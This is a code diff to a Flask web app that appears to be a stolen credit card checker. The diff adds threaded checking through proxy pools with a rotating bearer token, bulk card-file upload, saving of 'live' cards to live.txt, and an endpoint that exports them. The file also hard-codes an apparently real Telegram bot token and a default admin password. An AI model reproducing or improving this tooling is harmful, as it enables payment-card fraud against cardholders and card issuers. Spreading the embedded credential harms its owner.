@@ -10,10 +10,10 @@ import base64
 import struct
 import hashlib
 import hmac
-from flask import Flask, request, jsonify, render_template, Response
+from concurrent.futures import ThreadPoolExecutor, as_completed
+from flask import Flask, request, jsonify, render_template, Response, send_file
 from datetime import datetime, timedelta, timezone
 
-# Cryptography primitives for native RSA-OAEP and AES encryption
 from cryptography.hazmat.primitives.asymmetric import rsa, padding
 from cryptography.hazmat.primitives import hashes
 from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
@@ -26,6 +26,7 @@ urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
 app = Flask(__name__)
 DB_FILE = 'keys.json'
+LIVE_FILE = 'live.txt'
 ADMIN_PASSWORD = os.getenv("ADMIN_PASSWORD", "admin123")
 
 TELEGRAM_BOT_TOKEN = os.getenv("TELEGRAM_BOT_TOKEN", "9138065167:AAHG3HmeQ8a_v7jiuUVqECR-m2W7Xc14fqg")
@@ -61,6 +62,13 @@ def load_db():
 def save_db(data):
     with open(DB_FILE, 'w', encoding='utf-8') as f:
         json.dump(data, f, indent=4)
+
+def save_live_card(card_line, detail):
+    try:
+        with open(LIVE_FILE, "a", encoding="utf-8") as f:
+            f.write(f"{card_line} | {detail}\n")
+    except Exception:
+        pass
 
 def calculate_expiration_utc(amount, unit):
     if not amount or unit == 'lifetime':
@@ -436,7 +444,7 @@ def check_single_card(card_line, proxy_pool, token_manager):
         err_msg = str(e).encode('ascii', 'ignore').decode('ascii')
         return 2, "ERROR", err_msg or "Exception"
 
-def background_worker(cards, proxies_list):
+def background_worker(cards, proxies_list, max_threads):
     raw_pool = WebProxyPool(proxies_list)
     valid_proxies = []
     total_proxies = len(raw_pool.proxies)
@@ -458,40 +466,44 @@ def background_worker(cards, proxies_list):
                 valid_proxies.append(p_str)
         
         proxy_pool = WebProxyPool(valid_proxies) if valid_proxies else None
-        checker_queue.put({"status_msg": f"Proxy check done: {len(valid_proxies)}/{total_proxies} working."})
+        checker_queue.put({"status_msg": f"Proxy check done: {len(valid_proxies)}/{total_proxies} working. Starting threads..."})
     else:
         proxy_pool = None
-        checker_queue.put({"status_msg": "Running proxyless mode."})
+        checker_queue.put({"status_msg": "Running proxyless mode with threads..."})
 
     token_manager = DynamicTokenManager(FALLBACK_BEARER_TOKEN, proxy_pool)
     counts = {"checked": 0, "live": 0, "dead": 0, "error": 0, "total": len(cards)}
+    counts_lock = threading.Lock()
 
-    for card in cards:
+    def worker_task(card):
         if checker_stop_event.is_set():
-            break
+            return
         
-        if total_proxies > 0 and proxy_pool and not proxy_pool.proxies:
-            checker_queue.put({
-                "card": card, "status": "ERROR", "code": 2, "detail": "All proxies failed health check", **counts
-            })
-            counts["checked"] += 1
-            counts["error"] += 1
-            continue
-
         code, status, detail = check_single_card(card, proxy_pool, token_manager)
-        counts["checked"] += 1
-        if code == 0: counts["live"] += 1
-        elif code == 1: counts["dead"] += 1
-        else: counts["error"] += 1
+        
+        with counts_lock:
+            counts["checked"] += 1
+            if code == 0:
+                counts["live"] += 1
+                save_live_card(card, detail)
+            elif code == 1:
+                counts["dead"] += 1
+            else:
+                counts["error"] += 1
 
-        checker_queue.put({
-            "card": card,
-            "status": status,
-            "code": code,
-            "detail": detail,
-            **counts
-        })
-        time.sleep(0.2)
+            checker_queue.put({
+                "card": card,
+                "status": status,
+                "code": code,
+                "detail": detail,
+                **counts
+            })
+
+    with ThreadPoolExecutor(max_workers=max_threads) as executor:
+        futures = [executor.submit(worker_task, card) for card in cards]
+        for future in as_completed(futures):
+            if checker_stop_event.is_set():
+                break
 
     checker_queue.put({"finished": True, **counts})
 
@@ -504,14 +516,32 @@ def api_checker_start():
         except: pass
 
     checker_stop_event = threading.Event()
-    data = request.get_json() or {}
-    cards = [line.strip() for line in data.get('cards', '').split('\n') if line.strip()]
-    proxies = [line.strip() for line in data.get('proxies', '').split('\n') if line.strip()]
+    
+    cards = []
+    # Parse uploaded file if present
+    if 'file' in request.files:
+        file = request.files['file']
+        if file.filename != '':
+            content = file.read().decode('utf-8', errors='ignore')
+            cards.extend([line.strip() for line in content.splitlines() if line.strip()])
+
+    # Parse textarea cards if present
+    text_cards = request.form.get('cards', '')
+    if text_cards:
+        cards.extend([line.strip() for line in text_cards.split('\n') if line.strip()])
+
+    proxies_text = request.form.get('proxies', '')
+    proxies = [p.strip() for p in proxies_text.split('\n') if p.strip()]
+
+    try:
+        threads_val = int(request.form.get('threads', 10))
+    except ValueError:
+        threads_val = 10
 
     if not cards:
         return jsonify({"success": False, "message": "No cards provided"}), 400
 
-    threading.Thread(target=background_worker, args=(cards, proxies), daemon=True).start()
+    threading.Thread(target=background_worker, args=(cards, proxies, threads_val), daemon=True).start()
     return jsonify({"success": True})
 
 @app.route('/api/checker/stop', methods=['POST'])
@@ -531,6 +561,12 @@ def api_checker_stream():
             except queue.Empty:
                 continue
     return Response(event_stream(), mimetype="text/event-stream")
+
+@app.route('/api/checker/export')
+def api_checker_export():
+    if os.path.exists(LIVE_FILE):
+        return send_file(LIVE_FILE, as_attachment=True, download_name="live.txt")
+    return "No live cards found.", 404
 
 if __name__ == '__main__':
     port = int(os.environ.get('PORT', 5000))
